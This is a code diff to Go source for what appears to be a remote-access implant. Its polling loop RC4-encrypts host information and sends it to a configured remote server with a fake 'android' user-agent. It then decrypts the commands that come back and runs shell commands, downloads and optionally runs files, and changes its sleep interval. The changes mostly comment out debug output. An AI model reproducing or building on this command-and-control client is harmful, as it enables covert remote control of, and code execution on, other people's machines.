@@ -7,12 +7,13 @@ import (
 	"bytes"
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
+	//"fmt"
 	"github.com/satori/go.uuid"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"strconv"
+	"strings"
 	"time"
 )
 
@@ -38,26 +39,27 @@ type Core struct {
 	sleep         int
 	uuid          string
 	event         []Result
-
 }
-
+func (c *Core) RefreshInfo(){
+	c.info = utils.GetInformation()
+}
 func (c *Core) Pool() {
 	client := &http.Client{}
 	for {
-		fmt.Println("Loop")
+		//fmt.Println("Loop")
 		time.Sleep(time.Duration(c.sleep) * time.Second)
 		var result []Action
 		data := Work{Uuid: c.uuid, Result: c.event, Info: c.info, NextSecond: c.sleep}
 		c.event = nil
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
-			fmt.Println(1)
+			//fmt.Println(1)
 			log.Fatal(err)
 		}
 		encode := utils.ImmediateRC4(bytesJson)
 		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
 		if err != nil {
-			fmt.Println(2)
+			//fmt.Println(2)
 			log.Fatal(err)
 		}
 		req.Header.Add("UA", "android")
@@ -67,14 +69,14 @@ func (c *Core) Pool() {
 		}
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
-			fmt.Println(3)
+			//fmt.Println(3)
 			log.Fatal(err)
 		}
 		decode := utils.ImmediateRC4(body)
 
 		err = json.Unmarshal(decode, &result)
 		if err != nil {
-			fmt.Println(4)
+			//fmt.Println(4)
 			log.Fatal(err)
 		}
 		for _, i := range result {
@@ -86,7 +88,7 @@ func (c *Core) Pool() {
 					c.event = append(c.event, Result{Action: "cmd", Data: err.Error()})
 					break
 				}
-				fmt.Println("cmd", cmdData)
+				//fmt.Println("cmd", cmdData)
 				var cmd shell.Shell
 				err = json.Unmarshal([]byte(cmdData), &cmd)
 				if err != nil {
@@ -107,7 +109,7 @@ func (c *Core) Pool() {
 				}
 				err = json.Unmarshal([]byte(downData), &down)
 
-				fmt.Println("download",down.Path,down.Url,down.IsRun)
+				//fmt.Println("download", down.Path, down.Url, down.IsRun)
 				if err != nil {
 					c.event = append(c.event, Result{Action: "download", Data: err.Error()})
 				}
@@ -123,12 +125,13 @@ func (c *Core) Pool() {
 					break
 				}
 				err = json.Unmarshal([]byte(remarkData), &remark)
-				fmt.Println("remark",remark.Remark)
+				//fmt.Println("remark", remark.Remark)
 				if err != nil {
 					c.event = append(c.event, Result{Action: "remark", Data: err.Error()})
 				}
 				go func() {
 					c.event = append(c.event, Result{Action: "remark", Data: remark.ChangeRemark()})
+					c.RefreshInfo()
 				}()
 			case "sleep":
 				sleep, err := strconv.Atoi(i.Data)
@@ -156,7 +159,7 @@ func (c *Core) Pool() {
 			body, err = ioutil.ReadAll(resp.Body)
 
 		*/
-		fmt.Println("Loop End!")
+		//fmt.Println("Loop End!")
 	}
 }
 
@@ -168,9 +171,9 @@ func NewClient() Core {
 	} else {
 		u = u2.String()
 	}
-
+	//fmt.Println("Target", strings.TrimSpace(config.RemoteAddres))
 	c := Core{
-		remoteAddress: config.RemoteAddres,
+		remoteAddress: strings.TrimSpace(config.RemoteAddres),
 		info:          utils.GetInformation(),
 		uuid:          u,
 		sleep:         config.DefaultSleep,
